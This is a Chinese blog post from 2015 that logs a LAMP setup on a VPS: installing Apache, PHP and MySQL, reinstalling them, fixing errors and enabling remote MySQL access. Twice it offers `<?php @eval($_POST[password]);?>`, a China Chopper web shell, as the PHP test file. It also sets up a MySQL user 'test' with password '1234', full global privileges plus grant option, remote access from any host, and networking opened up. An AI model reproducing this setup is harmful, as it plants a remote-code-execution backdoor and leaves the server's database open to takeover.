VPS使用记录-APACHE+PHP+MYSQL环境搭建

发表于 2015-11-20   |  

之前搭建过一回用的的LAMP一键安装SHELL脚本，也不明白其中的过程，在这里把分部搭建的过程记录下来加深理解。

安装过程

apt-get install apache2
apt-get install mysql-server-5.5           #安装过程中需要输入root用户密码
apt-get install php5 libapache2-mod-php5
apt-get install libapache2-mod-auth-mysql
apt-get install php5-mysql
/etc/init.d/apache2 restart                    #重启
/etc/apache2/apache.conf                     #配置文件
/var/www/                                      #根目录

添加如下php文件进行测试，看看能否正常解析

<?php @eval($_POST[password]);?>            #菜刀连接

Apache重新安装

apt-get --purge autoremove apache*
find /etc -name "*apache*" |xargs  rm -rf                  #搜索并删除
dpkg -l |grep apache2|awk '{print $2}'|xargs dpkg -P     #删除关联
dpkg -l |grep apache2                                    #看看是否还存在关联信息
apt-get install    apache2                                 #安装

这里安完了会报两行错
错误1： AH00557: apache2: apr_sockaddr_info_get() failed for FengServer

hostname        #查看主机名
vim /etc/hosts  添加如下信息 
127.0.0.1       FengServer

错误2：AH00558: apache2: Could not reliably determine the server’s fully qualified domain name, using 127.0.0.1. Set the ‘ServerName’ directive globally to suppress this message

vim /etc/apache2/apache.conf #添加如下信息
ServerName FengServer #主机名为 - FengServer

安完发现php又报错，真是日了狗了~

php重新安装

apt-get --purge remove libapache2-mod-php5 php5 php5-gd php5-mysql
apt-get autoremove php5
dpkg -l|grep php| awk '{print $2}'|xargs dpkg -P    #删除关联
dpkg -l|grep php                                     #检查是否有残余
dpkg -l|grep php5                                
apt-get install php5 libapache2-mod-php5            #只安装一个php5会出问题
<?php @eval($_POST[password]);?>                    #菜刀连接，测试能够正常解析

mysql远程连接配置

netstat -anl | grep 3306     #mysql默认不允许远程连接
在/etc/mysql/my.cnf文件下找到如下代码
/etc/mysql/my.cnf

# Instead of skip-networking the default is now to listen only on  
# localhost which is more compatible and is not less secure.  
bind-address  = 127.0.0.1  

将bind-address注释掉或者改成自己的ip，在这里我给注释掉了。

进入mysql创建用户
mysql> insert into mysql.user(Host,User,Password) values("localhost","test",password("1234"));

分配权限
mysql> grant all privileges on *.* to test;
mysql> grant all privileges on *.* to test with grant option;

在本机适用以下命令连接

mysql -h IP -uUsername -pPassword #-u 和 Username之间空格可加可不加 -p和Password之间不能有空格

说明：
新建用户的时候Host内容为允许连接的IP或者‘%’（允许所有IP连接）这里选用后者。
因为可以远程连接password设为强密码。
